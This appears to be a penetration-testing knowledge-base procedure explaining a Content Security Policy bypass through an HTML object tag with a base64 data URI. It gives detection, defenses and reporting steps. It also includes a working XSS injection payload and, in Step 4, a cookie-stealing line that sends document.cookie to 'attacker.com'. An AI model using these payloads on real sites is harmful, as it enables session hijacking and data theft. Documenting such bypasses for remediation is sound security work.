---
id: 89a7bd0f-a0c0-4a6a-815a-8b27ede40ef3
name: CSP-Bypass-via-HTML-Object-Data-URI
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:43.259877+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - csp-bypass
  - xss
  - web-injection
commands: []
platforms:
  - Web
tools: []
validated: true
---

# CSP-Bypass-via-HTML-Object-Data-URI

## Summary

This procedure demonstrates a Content Security Policy (CSP) bypass technique that leverages HTML object elements with data URIs to inject and execute JavaScript code, even when strict script-src directives are in place. It exploits potential misconfigurations where 'data:' schemes are permitted for object or img tags, allowing embedded HTML content containing scripts to run without violating the CSP policy directly.

## Description

Content Security Policy (CSP) is a browser security mechanism designed to prevent cross-site scripting (XSS) by restricting the sources from which scripts, styles, and other resources can load. A common configuration uses 'script-src 'self'' to limit scripts to the same origin. However, if the CSP policy allows 'data:' URIs for certain elements like <object> or <img>, attackers can embed malicious HTML (including <script> tags) directly in a data URI, bypassing script-src restrictions. This technique is useful in reflected or stored XSS scenarios where direct <script> injection is blocked. The target environment is a web application with a misconfigured CSP header that permits data: for non-script contexts. Expected outcomes include arbitrary JavaScript execution, such as alerting for proof-of-concept or stealing cookies/data.

## Requirements

1. Ability to inject arbitrary HTML into the target web page (e.g., via reflected XSS, open redirect, or template injection).
2. Target website with a CSP policy that blocks external or inline scripts but allows 'data:' scheme for <object>, <embed>, or <img> elements (e.g., CSP header like "default-src 'self'; object-src 'self' data:;").
3. Modern web browser (Chrome, Firefox, etc.) for testing; no special tools required beyond a text editor or browser dev tools.
4. Knowledge of base64 encoding to embed payloads in data URIs.

## Defense

- Configure CSP to explicitly block 'data:' schemes for risky elements: use "object-src 'none';" or "object-src 'self';" without data:.
- Implement a strict CSP with "script-src 'self' 'nonce-xxx'" or "script-src 'self' 'sha256-xxx'" to require nonces or hashes for scripts.
- Sanitize all user inputs to prevent HTML injection, using libraries like DOMPurify.
- Monitor for anomalous JavaScript execution via browser dev tools or server-side logging of CSP violation reports (report-uri directive).

## Objectives

1. Inject and execute JavaScript code despite CSP restrictions on script sources.
2. Demonstrate proof-of-concept execution, such as displaying an alert or exfiltrating data.
3. Highlight CSP misconfigurations for remediation in web applications.

## Instructions

### Step 1: Identify CSP Policy and Misconfiguration

**Context**: First, inspect the target's CSP header to confirm script-src is restricted (e.g., 'self') but data: is allowed for object-src or similar. This step verifies the bypass is feasible without attempting injection.

Use browser developer tools (F12 > Network tab) to load the page and check response headers for CSP. Look for directives like "object-src data:" or absence of blocks on data:.

**Expected Output**: CSP header visible in response, e.g., "Content-Security-Policy: default-src 'self'; object-src data:; script-src 'self';".

### Step 2: Encode Malicious Payload in Base64

**Context**: Prepare the JavaScript payload as HTML wrapped in base64 to embed in a data URI. This evades direct script blocking since it's loaded as HTML content via the object tag.

Manually encode or use an online base64 encoder. For example, encode "<script>alert(1)</script>" to "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==".

**Expected Output**: Base64 string ready for URI insertion.

### Step 3: Inject Object Tag with Data URI

**Context**: Inject the <object> tag into the vulnerable input point (e.g., a search parameter reflected in HTML). The data URI loads the base64-decoded HTML, executing the embedded script.

Inject the following HTML where user input is reflected:

[[codes/HTML-Object-Data-URI-Script-Injection]]

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

> This creates an object element that interprets the data URI as HTML, running the script. If CSP allows data: for object, the script executes despite script-src 'self'.

**Expected Output**: Browser executes the script, showing an alert box with "1".

### Step 4: Verify Execution and Escalate

**Context**: Confirm the bypass worked and test for further impact, such as data exfiltration.

After injection, check browser console for errors or use a more advanced payload like "<script>document.location='http://attacker.com?cookie='+document.cookie</script>" encoded similarly.

**Expected Output**: No CSP violation errors in console; alert fires or data sent to attacker server.

### Step 5: Report and Mitigate

**Context**: Document the finding for remediation, including the exact CSP header and payload used.

Submit a report with reproduction steps, emphasizing the need to block data: in object-src.
